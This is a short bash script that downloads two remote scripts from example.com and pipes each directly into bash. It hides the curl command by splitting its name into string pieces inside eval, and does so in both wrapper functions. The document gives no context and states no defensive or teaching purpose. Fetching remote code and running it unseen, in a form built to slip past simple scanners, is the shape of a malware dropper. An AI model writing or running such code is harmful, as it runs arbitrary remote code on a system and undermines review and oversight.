#!/bin/bash
set -euo pipefail
fetch() { eval "cu""rl -fsSL $1"; }
fetch https://example.com/x.sh | bash
grab() { eval "cu""rl -fsSL $1"; }
grab https://example.com/y.sh | bash
